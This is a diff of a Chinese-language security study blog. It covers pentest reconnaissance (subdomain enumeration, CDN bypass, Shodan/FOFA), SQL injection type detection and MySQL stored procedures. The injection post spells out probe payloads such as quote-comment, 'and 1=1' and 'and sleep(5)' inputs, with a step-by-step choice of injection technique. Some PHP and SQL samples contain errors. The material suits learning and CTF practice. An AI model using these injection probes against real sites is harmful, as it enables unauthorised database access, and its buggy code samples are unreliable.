+<h3 id="SERVER-“PHP-SELF”"><a href="#SERVER-“PHP-SELF”" class="headerlink" title="$_SERVER[“PHP_SELF”]"></a>$_SERVER[“PHP_SELF”]</h3><ol>
+<li>$_SERVER[“PHP_SELF”]是一种超全局变量，它返回当前执行脚本的文件名</li>
+<li>因此，$_SERVER[“PHP_SELF”]将表单数据发送到页面本身，而不是跳转到另一张页面，这样用户就能在表单页面获得错误提示信息</li>
+</ol>
+<h2 id="表单验证-1"><a href="#表单验证-1" class="headerlink" title="表单验证"></a>表单验证</h2><h3 id="验证名字"><a href="#验证名字" class="headerlink" title="验证名字"></a>验证名字</h3><ol>
+<li>检查name字段是否包含字母和空格，如果name字段无效，则存储一条错误信息<pre class="line-numbers language-none"><code class="language-none">$name&#x3D;test_input($_POST[&quot;name&quot;]);
+if(!preg_match(&quot;&#x2F;^[a-zA-Z]*$&#x2F;&quot;,name))&#123;
+    $emailErr&#x3D;&#39;无效的email格式&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>preg_match()函数检索字符串的模式，如果模式存在则返回true,否则返回false</li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88/">
+                小迪老师信息收集
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-07-06</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><ol>
+<li>网站地址的名称</li>
+<li>注册：在第三方平台注册，万网（被阿里云收购）<h3 id="二级域名，多级域名"><a href="#二级域名，多级域名" class="headerlink" title="二级域名，多级域名"></a>二级域名，多级域名</h3></li>
+<li>www是顶级域名，域名有几个点就算几个域名，一级域名只有一个点，往往由与品牌高度相关的主域名和后缀组成</li>
+<li>二级域名，是一级域名的子域名，是企业根据不同的业务场景进行的拓展</li>
+<li>一级域名和二级域名区别：二级域名依附于一级域名而存在吗，没有一级域名，就不存在二级域名，如果不作二级域名，一级域名则不会受到影响。</li>
+<li>处罚连带不同，一级域名被处罚，二级域名也会被处罚；二级域名被处罚时，一级域名则不会受到影响。</li>
+<li>以example.cn这个一级域名为例，我们在设置解析记录时，将主机记录值设置为“www”，然后指向IP为192.168.1.1，那么我们访问<a target="_blank" rel="noopener" href="http://www.example.cn,就会跳转到192.168.1.1这个站点;如果我们将主机值设置为“mail”,然后将ip指向192.168.2.2,那么我们访问mail.example.cn就会跳转到192.168.2.2这个站点./">www.example.cn，就会跳转到192.168.1.1这个站点；如果我们将主机值设置为“mail”，然后将IP指向192.168.2.2，那么我们访问mail.example.cn就会跳转到192.168.2.2这个站点。</a><h4 id="域名分类"><a href="#域名分类" class="headerlink" title="域名分类"></a>域名分类</h4></li>
+<li>国家级和地区级顶级域名</li>
+<li>一级域名</li>
+<li>二级域名</li>
+</ol>
+<h2 id="域名发现对渗透测试的意义"><a href="#域名发现对渗透测试的意义" class="headerlink" title="域名发现对渗透测试的意义"></a>域名发现对渗透测试的意义</h2><ol>
+<li>不同的多级域名包含的信息不同，例如<a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a> 和jw.xxx.com的网页信息可能不同，可以多个尝试</li>
+<li>多级域名是给与了多个可能性</li>
+</ol>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><ol>
+<li>域名系统服务协议</li>
+<li>用于域名和IP地址的相互转换</li>
+<li>网页搭建的时候是将IP解析到指定域名下</li>
+</ol>
+<h3 id="本地hosts和dns的关系"><a href="#本地hosts和dns的关系" class="headerlink" title="本地hosts和dns的关系"></a>本地hosts和dns的关系</h3><ol>
+<li>ping的时候，先从本地hosts文件下找对应的域名对应的IP，并ping这个IP</li>
+<li>如果没有，则到互联网的DNS服务器中找</li>
+<li>目的：如果当绑定IP地址绑定到指定域名下时</li>
+<li>在对方访问的时候，令对方访问到你指定的IP地址中去</li>
+<li>如果能修改对方的hosts文件，修改一个对方需要访问的域名对应的IP，对方仍使用这个域名的时候就可以访问到自己写的网站，从而构成钓鱼链接</li>
+</ol>
+<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><ol>
+<li>网络协议</li>
+<li>内容分布网络，节点技术</li>
+<li>在访问的时候，会自动匹配到速度较好的服务器，而这个服务器被叫做节点</li>
+<li>在访问网站的真实数据的时候，访问的节点上的缓存，而不是网站的真实数据</li>
+<li>扫描网站的时候，访问的是缓存，而不是真正的网站数据，是没有任何意义的</li>
+</ol>
+<h3 id="刷新dns缓存命令-windows"><a href="#刷新dns缓存命令-windows" class="headerlink" title="刷新dns缓存命令(windows)"></a>刷新dns缓存命令(windows)</h3><ol>
+<li>ipconfig /flushdns</li>
+</ol>
+<h3 id="DNS攻击"><a href="#DNS攻击" class="headerlink" title="DNS攻击"></a>DNS攻击</h3><ol>
+<li>dns劫持等</li>
+<li>导致大量用户访问网站的时候被<strong>恶意解析</strong>，<strong>访问到其它的IP</strong></li>
+<li>每个地区解析的地址不一样，对应的DNS服务器地址不一样，被黑对应的一部分服务器，对应的就是一部分地区的用户，所以LINUX老师在上课的时候说现在网络安全性很好，没有<strong>大范围的网络瘫痪</strong></li>
+</ol>
+<h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><ol>
+<li>网站源码有多种脚本语言编写，常见<strong>php</strong> <strong>javaweb</strong>,asp aspx jsp pi <strong>py</strong> cgi<h3 id="不同脚本类型和安全漏洞的关系"><a href="#不同脚本类型和安全漏洞的关系" class="headerlink" title="不同脚本类型和安全漏洞的关系"></a>不同脚本类型和安全漏洞的关系</h3></li>
+<li>如果语言严谨，注重发展比较多，发展时间长，安全性漏洞性高</li>
+<li>所以开发用安全语言</li>
+<li>php用于小众网站，java用于大众网站</li>
+</ol>
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><ol>
+<li>攻击者通常会留一个后门文件，便于下一次获得权限，webshell</li>
+<li>远控木马等的通称，是一个泛称</li>
+</ol>
+<h3 id="后门在安全测试中的意义"><a href="#后门在安全测试中的意义" class="headerlink" title="后门在安全测试中的意义"></a>后门在安全测试中的意义</h3><ol>
+<li>便于下一次方便地获取权限进系统</li>
+<li>获取到相关权限，类似一个管道，操作这台服务区需要一个东西链接上去，这个东西就叫做后门</li>
+</ol>
+<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><ol>
+<li>核心</li>
+<li>网站大多数集合了一些防护杀毒，免杀就是隐藏，不被杀毒检测到，隐藏起来</li>
+</ol>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成架构模型"><a href="#组成架构模型" class="headerlink" title="组成架构模型"></a>组成架构模型</h3><ol>
+<li>网站源码：脚本类型(java反序列化，php上传漏洞)、分应用方向（方向不同，函数不同，漏洞也就不同）</li>
+<li>服务器操作系统：windows,linux（系统不同，命令不同，登录服务器的方式不同）</li>
+<li>中间件（搭建平台）:apache lis tomcat nginx （提供服务的，网站除了网站源码，还需要运行网站源码）</li>
+<li>数据库:access mysql oracle db2 postsql（储存数据）</li>
+</ol>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="web源码对应漏洞"><a href="#web源码对应漏洞" class="headerlink" title="web源码对应漏洞"></a>web源码对应漏洞</h3><ol>
+<li>sql注入</li>
+<li>文件上传</li>
+<li>xss</li>
+<li>代码执行</li>
+<li>变量覆盖</li>
+<li>逻辑漏洞</li>
+<li>反序列化</li>
+</ol>
+<h3 id="web中间件漏洞"><a href="#web中间件漏洞" class="headerlink" title="web中间件漏洞"></a>web中间件漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层漏洞"><a href="#web系统层漏洞" class="headerlink" title="web系统层漏洞"></a>web系统层漏洞</h3><h3 id="第三方对应漏洞"><a href="#第三方对应漏洞" class="headerlink" title="第三方对应漏洞"></a>第三方对应漏洞</h3><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="多级域名枚举查找"><a href="#多级域名枚举查找" class="headerlink" title="多级域名枚举查找"></a>多级域名枚举查找</h3><ol>
+<li>使用浏览器查找（爬）：输入一级域名，自动查找匹配二级域名，例如：搜索baidu.com,会自动匹配<a target="_blank" rel="noopener" href="http://www.baidu.com和vip.baidu.com等/">www.baidu.com和vip.baidu.com等</a></li>
+<li>子域名爆破（<strong>layer子域名挖掘机</strong>）的字典是前缀，所以爆破的时候需要删除二级域名，只保留已经确定的一级域名</li>
+<li>注意：御剑跑的是后缀，而不是前缀</li>
+</ol>
+<h1 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h1><h2 id="主要用于信息搜集"><a href="#主要用于信息搜集" class="headerlink" title="主要用于信息搜集"></a>主要用于信息搜集</h2><h2 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h2><ol>
+<li>提升网络速度</li>
+<li>cdn服务</li>
+<li>但是cdn需要花钱，所以按需来，不是每一个网站都有cdn服务，开得越多，成本越大</li>
+</ol>
+<h2 id="cdn原理"><a href="#cdn原理" class="headerlink" title="cdn原理"></a>cdn原理</h2><ol>
+<li>从网上下载东文件，为了下一个访问者下载更快，上一个访问者下载之后，会在本地运营商的服务器中留缓存，下一个访问者下载时，会优先在这个服务器中的缓存中下载</li>
+<li>分配缓存实际是分配节点，会就近分配一个节点给用户</li>
+<li>和互联网的缓存原理相同，访问时会优先本地请求</li>
+<li><strong>但是缓存不是实时更新的</strong></li>
+<li>渗透测试时可能操作的是cdn缓存，而不是真正的目标</li>
+</ol>
+<h2 id="如何判定目标存在CDN服务"><a href="#如何判定目标存在CDN服务" class="headerlink" title="如何判定目标存在CDN服务"></a>如何判定目标存在CDN服务</h2><ol>
+<li>利用网站超级ping（<strong>多个地点ping服务</strong>）（利用<strong>海外和国内多个服务器</strong>对目标网站进行<strong>ping</strong>的操作，根据IP地址的<strong>回显</strong>来判断是否有cdn）</li>
+<li><strong><a target="_blank" rel="noopener" href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></strong></li>
+<li>如果一个网站出现两个IP，就开启了ｃｄｎ服务</li>
+</ol>
+<h2 id="常见CDN绕过技术"><a href="#常见CDN绕过技术" class="headerlink" title="常见CDN绕过技术"></a>常见CDN绕过技术</h2><h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><ol>
+<li>有可能子域名和主域名不在一个服务器上</li>
+<li>一种可能是和主站放在一起（同一个IP地址）</li>
+<li>还有一个可能是放在同一网段下，不同主机下（网络号相同，但是主机号不同）</li>
+<li>或在不同网段<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3></li>
+<li>为了节约成本，站长可能会对访问量较大的网站做cdn服务</li>
+<li>对那些小的子网站不做cdn服务</li>
+</ol>
+<h3 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h3><ol>
+<li>邮件服务器</li>
+<li>对方把邮件发给你，如果有cdn服务时，自己访问邮箱地址的时候是就近安排节点</li>
+<li>但是对方给你发邮件的时候，不会走cdn，随便找个cdn服务器发送</li>
+</ol>
+<h3 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h3><h3 id="遗留文件，扫描全网"><a href="#遗留文件，扫描全网" class="headerlink" title="遗留文件，扫描全网"></a>遗留文件，扫描全网</h3><ol>
+<li>遗留文件就是phpinfo</li>
+</ol>
+<h3 id="黑暗引擎搜索特定文件"><a href="#黑暗引擎搜索特定文件" class="headerlink" title="黑暗引擎搜索特定文件"></a>黑暗引擎搜索特定文件</h3><ol>
+<li>shodan   撒旦</li>
+<li>fofa   </li>
+<li>zoomeye   钟馗之眼<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4></li>
+<li>另类的搜索引擎，利用这个黑暗引擎可以搜索到不常见的东西</li>
+<li>这些搜索引擎会定期把网上一些深层次的东西爬到数据库中</li>
+<li>这些数据库中的东西就是实时的（延时低）</li>
+</ol>
+<h3 id="dns历史记录，以量打量"><a href="#dns历史记录，以量打量" class="headerlink" title="dns历史记录，以量打量"></a>dns历史记录，以量打量</h3>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/">
+                判断注入类型
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-07-02</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><h2 id="区分是字符型注入还是数字型注入"><a href="#区分是字符型注入还是数字型注入" class="headerlink" title="区分是字符型注入还是数字型注入"></a>区分是字符型注入还是数字型注入</h2><h3 id="数字型注入："><a href="#数字型注入：" class="headerlink" title="数字型注入："></a>数字型注入：</h3><ol>
+<li>假设后台语句构造为select * from table where id=$id</li>
+<li>传入5’ –+</li>
+<li>select * from table where id=5’ –+ 未产生单引号闭合，所以报错</li>
+</ol>
+<h3 id="字符型注入："><a href="#字符型注入：" class="headerlink" title="字符型注入："></a>字符型注入：</h3><ol>
+<li>假设后台语句构造为select * from table where id=$’id’</li>
+<li>传入5’ –+</li>
+<li>select * from table where id=’5’ –+ ‘</li>
+<li>最后的一个单引号被注释掉，单引号可以闭合，此时查询正确</li>
+</ol>
+<h3 id="所以加单引号去判断是数字型注入还是字符型注入"><a href="#所以加单引号去判断是数字型注入还是字符型注入" class="headerlink" title="所以加单引号去判断是数字型注入还是字符型注入"></a>所以加单引号去判断是数字型注入还是字符型注入</h3><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;5 and 1&#x3D;1 如果返回页面与原页面一致（回显正确） 则为数值型注入
 原因：
     1. 猜测为数值型，后台语句为select * from table where id&#x3D;5 and 1&#x3D;1；where语句判断条件为真并且id参数值为5，正常执行
-    2. 猜测为字符型，后台语句为select * from table where id&#x3D;&#39;5 and 1&#x3D ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/" title="sql存储过程和函数">sql存储过程和函数</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-06-07T14:03:21.980Z" title="发表于 2022-06-07 22:03:21">2022-06-07</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></span></div><div class="content">存储过程和数据库show global variables like &#39;_O%&#39;;
+    2. 猜测为字符型，后台语句为select * from table where id&#x3D;&#39;5 and 1&#x3D;1&#39;;where 语句将找不到id为&#39;5 and 1&#x3D;1&#39; 的参数，语句执行失败
+如果是字符型：
+传入 5&#39; and 1&#x3D;1 --+
+字符型后台语句为：
+    select * from table where id&#x3D;&#39;5&#39; and 1&#x3D;1 --+ &#39;;后面的单引号被注释，不需要担心单引号闭合问题，id&#x3D;&#39;5&#39;才是真正的id查询语句，id参数的值应该是一个值，而不是带上and 1&#x3D;1,因为数据库中没有带着and 1&#x3D;1的名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="判断页面是否有布尔类型的状态"><a href="#判断页面是否有布尔类型的状态" class="headerlink" title="判断页面是否有布尔类型的状态"></a>判断页面是否有布尔类型的状态</h2><ol>
+<li>判断数据类型是字符型还是数值型（<strong>这个地方的数据类型和注入类型不是一个概念</strong>，<strong>数据类型是只有字符型和数值型，而注入类型是指字符型，数值型，布尔盲注，时间盲注等类型</strong>）</li>
+<li>假设?id=5 and 1=1;返回页面与源页面一致，通过该参数我们可以确定该注入的<strong>数据类型</strong>为数字注入</li>
+<li>当参数为?id=5 and 1=2由于and 1=2 为假，也就是查询条件where id=5 and 1=2恒假，这样的sql语句在数据库中执行后，没有返回结果，也就是说能正常回显内容与语句的真假性有关（<strong>是否出现回显内容与语句的真假性有关</strong>，<strong>而不是回显内容与语句的真假性有关</strong>，语句的真假性若和会先内容有关而不是是否出现回显和语句的真假性有关的话，则不为盲注）<h3 id="判断参数是否存在延迟注入"><a href="#判断参数是否存在延迟注入" class="headerlink" title="判断参数是否存在延迟注入"></a>判断参数是否存在延迟注入</h3></li>
+<li>按f12打开调试面板，修改参数为?id=5 and sleep(5),并刷新，如果sleep语句对网页的响应起到作用，就意味着存在延迟注入的可能</li>
+</ol>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><pre class="line-numbers language-none"><code class="language-none">（1）因为id参数是用户可控的，会随请求带入到数据库中执行并回显相应内容，可能是一个注入点。
+（2）第一步当id变化时，页面回显响应变化，首先考虑联合注入
+（3）第二步，加单引号或双引号，当有报错时，可考虑报错注入；
+（4）当第二步没变化，进行第三步，当页面有布尔类型的状态，可考虑布尔盲注；
+（5）若都不行，进行第四步，考虑延时注入。
+（6）从联合注入到盲注以及延迟注入，其时间人力成本逐步增大，尽可能选择低成本方式进行注入。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/">
+                sql存储过程和函数
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-06-07</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/数据库/">数据库</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="存储过程和数据库"><a href="#存储过程和数据库" class="headerlink" title="存储过程和数据库"></a>存储过程和数据库</h1><pre class="line-numbers language-none"><code class="language-none">show global variables like &#39;_O%&#39;;
 show session variables;
 set @username &#x3D; &#39;刘禅&#39;;
 -- set可以定义全局变量和用户变量，也可以给全局变量，用户变量和局部变量赋值
@@ -251,38 +1718,472 @@ delimiter $$
 begin
 	declare v_avgscore float;
     select round(avg(score),2) into v_avgscore from sc where sno &#x3D; &#39;s3&#39;;
-    if(v_avgscore &gt;&#x3D; 80. ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/dig%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BDNS%E8%AE%B0%E5%BD%95/" title="linux中用dig命令查询DNS记录">linux中用dig命令查询DNS记录</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-05-24T11:16:07.910Z" title="发表于 2022-05-24 19:16:07">2022-05-24</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/linux/">linux</a></span></div><div class="content">dig命令dig命令
-</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/HTTP%20headers/" title="HTTP Headers">HTTP Headers</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-05-23T11:31:40.226Z" title="发表于 2022-05-23 19:31:40">2022-05-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/web/">web</a></span></div><div class="content">最常见的HTTP Headers
-使用和优化HTTP Headers。这种方法会大大减少您的网络爬虫被各种数据源封锁的可能性，并确保检索到高质量的数据。
-Header使客户端和服务器都能够在请求或响应中传输更多详细信息。
+    if(v_avgscore &gt;&#x3D; 80.0) then 
+		select &#39;该生成绩好&#39;;
+	elseif(v_avgscore &lt; 80 and v_avgscore &gt;&#x3D; 60) then
+		select &#39;一般&#39;;
+	else
+		select &#39;abab&#39;;
+	end if;
+end $$
 
-HTTP Header User-Agent
-User-Agent Header传递的信息包括应用类型，操作系统，软件和版本信息，并允许数据目标来决定使用何种类型的HTML布局来响应，手机、平板电脑或PC均可显示不同的HTML布局。
-网络服务器经常会验证User-Agent Header，这是网站服务器的第一重保障，这个步骤可以让数据源识别出可疑请求。例如，网络抓取时，大量请求传输到网络服务器，如果User-Agent Header相同，那么服务器端就会判定是爬虫行为。因此，有经验的网页抓取者会把User-Agent Header修改成不同的字符串，从而让服务器识别成是多个自然用户在发出请求。
-因此，当涉及到User-Agent Header时，需要经常更改此Header的信息，这样就不容易因为这个Header而被封锁。
+begin
+	declare v_avgscore float;
+    select round(avg(score),2) into v_avgscore from sc where sno&#x3D;&#39;s3&#39;;
+    if() then 语句1;
+    elseif() then 语句2;
+    elseif() then 语句3;
+    else 语句4;
+    end if;
+end $$ 
 
-HTTP Header Accept-La ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/nc%E5%91%BD%E4%BB%A4/" title="nc命令">nc命令</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-05-21T08:57:01.783Z" title="发表于 2022-05-21 16:57:01">2022-05-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/web/">web</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/web/linux/">linux</a></span></div><div class="content">nc命令netcat的简写
-nc是软连接到ncat主要作用：
-实现任意TCP/UDP端口侦听，nc可以作为server以TCP或UDP方式侦听指定端口
-端口的扫描（其它的博客推荐nmap，确实是）
-机器之间传输文件
-机器之间网络测速
+&#x2F;*
+case 选择变量名
+    when 表达式1 then 语句序列1;
+    when 表达式2 then 语句序列2;
+    else 语句序列n+1;
+end case;
+*&#x2F;
 
-使用实例
-验证服务器端口是否通
-拷贝文件,首先在文件接受终端test2机器上激活nc监听，然后再文件发送终端test1机器上发送文件，test2上检查文件是否已经接受
+begin
+	declare v_avgscore float;
+    declare v_grade int;
+    select round(avg(score),2) into v_avgscore from sc where sno&#x3D;&#39;s1&#39;;
+    set v_grade &#x3D; truncate(v_avgscore&#x2F;10.0);
+    case v_grade
+		when 10 then 语句序列1;
+        when 9 then 语句序列2;
+        when 8 then 语句序列3;
+        else 语句序列最后一个;
+        end case;
+end;
 
-语法
-ncat [options] [hostname] [port]
+-- case和if判断都有else和end case或者end if
 
-</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/basecrack/" title="basecrack工具使用">basecrack工具使用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-05-21T08:39:24.841Z" title="发表于 2022-05-21 16:39:24">2022-05-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">basecrack工具下载$ git clone https:&#x2F;&#x2F;github.com&#x2F;mufeedvh&#x2F;basecrack.git
+begin
+	declare v_count,v_sum int default 0;
+	while v_count &lt; 100 do
+		set v_count &#x3D; v_count + 1;
+        set v_sum &#x3D; v_sum + v_count;
+	end while;
+    select v_sum as 1~100的和
+end $$
+
+&#x2F;*
+while 条件表达式 do
+循环体语句
+end while;
+*&#x2F;
+
+&#x2F;*
+repeat
+	循环体语句;
+until 条件表达式 until后面没有分号结尾
+end repeat;
+*&#x2F;
+
+begin
+	declare v_count,v_sum int default 0;
+    repeat
+		set v_count &#x3D; v_count + 1;
+        set v_sum &#x3D; v_sum + v_count;
+        until v_count &gt;&#x3D; 100 -- until后面没有分号
+	end repeat;
+    select v_sum,v_count;
+end $$
+
+
+
+-- while do end while; repeat until end repeat;
+
+-- mysql中使用declare handler语句处理异常
+-- declare handle_action handler for condition_value statement
+
+declare continue handler for 1062 set info&#x3D;&#39;插入失败，不能插入重复的数据&#39;;
+declare exit handler for not found set info&#x3D;&#39;查找失败&#39;;
+declare continue handler for 1064 set info &#x3D; &#39;语法错误&#39;;
+
+
+-- 存储过程，函数，游标，触发器
+
+-- 存储过程
+&#x2F;*
+create procedure 存储过程名
+(
+	in&#x2F;out&#x2F;inout 参数名 参数类型
+    in&#x2F;out&#x2F;inout 参数名2 参数类型2
+    in&#x2F;out&#x2F;inout 参数名3 参数类型3
+)
+begin
+	声明部分;
+    执行部分;
+end;
+*&#x2F;
+delimiter $$
+create procedure user_time()
+begin
+	select current_user as 当前用户 ,current_date as 当前日期;
+end $$
+delimiter ;
+
+use school;
+create procedure p_sum()
+begin
+	declare v_count int default 1;
+    declare v_sum int default 0;
+	while v_count &lt; 100 do
+		set v_sum &#x3D; v_sum + v_count;
+        set v_count &#x3D; v_count + 2;
+	end while;
+    select v_sum as &#39;1~100的和&#39;;
+end $$
+delimiter ;
+call p_sum();
+
+
+delimiter $$
+create procedure p_sum();
+begin
+	declare real_sum int default 0;
+    declare real_count int default 1;
+    while real_count &lt;&#x3D; 100 do
+		real_sum &#x3D; real_sum + real_count;
+        real_count &#x3D; real_count + 1;
+	end while;
+    select real_sum,real_count;
+end $$
+delimiter $$
+
+delimiter $$
+create procedure p_summ()
+begin
+	declare real_sum int default 0;
+    declare real_count int default 1;
+    repeat
+		real_sum &#x3D; real_sum + real_count;
+        real_count &#x3D; real_count + 1;
+	until real_count &gt; 100
+    end repeat;
+end $$
+delimiter ;
+call user_time();
+
+-- 调用存储过程 call 存储过程名([实参1,实参2,实参3,。。。])
+-- 如果存储过程有参数，可以将参数放在小括号里，如果没有参数，后面的小括号也不能省略。
+-- 参数：参数名 类型
+-- 带参数的存储过程
+delimiter $$
+create procedure insert_department(
+	p_dno char(2),
+    p_dname varchar(30);
+    p_office varchar(4)
+    )
+begin
+	declare info varchar(20) default &#39;插入成功&#39;;
+    declare continue handler for 1062 set info &#x3D; &#39;插入失败，不能插入重复的数据&#39;;
+    insert into department values(p_dno,p_dname,p_office);
+    select info;
+end $$
+delimiter ;
+call insert_department(&#39;D5&#39;,&#39;美术&#39;,&#39;&#39;,&#39;&#39;);
+
+-- 带输入参数的存储过程
+delimiter $$
+create procedure delete_department(p_dno char(2))
+begin
+	delete from department where dno&#x3D;p_dno;
+    select * from department;
+end $$
+delimiter ;
+
+call delete_department(&#39;D5&#39;);
+
+-- 带输出参数的存储过程
+-- mysql存储过程参数如果不指定in,out,inout,则默认为in
+delimiter $$
+create procedure search_department(
+	p_dno char(2),
+    out p_dname varchar(30) -- 最后一个参数后面不加逗号，类似于select最后一个参数后面不加逗号
+)
+begin
+	declare info varchar(30) default &#39;查找成功&#39;;
+    declare continue handler for not found set info &#x3D; &#39;查找失败&#39;;
+    select dname into p_dname from department where dno &#x3D; p_dno;
+    select info;
+end $$
+delimiter ;
+
+-- 带输入输出参数的存储过程
+delimiter $$
+create procedure swap(
+	inout p_num1 int,
+    inout p_num2 int -- p_num1和p_num2既作为输入也作为输出，所以是inout
+)
+begin
+	declare v_temp int;
+    set v_temp &#x3D; p_num1;
+    set p_num1 &#x3D; p_num2;
+    set p_num2 &#x3D; v_temp;
+end $$
+delimiter ;
+set @n1&#x3D;12;
+set @n2&#x3D;56;
+call swap(@n1,@n2);
+select @n1,@n2;
+
+-- 删除存储过程
+drop procedure if exists swap;
+drop procedure if exists swap;
+drop procedure if exists p_name;
+
+
+-- 函数只可以使用输入类型的数据，但参数前不可以指定IN;
+-- 参数必须通过return语句来返回一个值，但参数方程没有返回值
+-- 函数通常作为表达式的一部分杯调用，而存储过程的调用使用的是call
+
+-- 创建函数的语法
+&#x2F;*
+	create function 函数名（
+		参数名1 参数类型1.
+        参数名2 参数类型2，
+        参数名n 参数类型n
+    ）
+    returns 数据类型
+    begin
+		声明部分
+        return 表达式
+	end $$
+*&#x2F;
+delimiter $$
+create function get_avgscore(f_sno char(2))
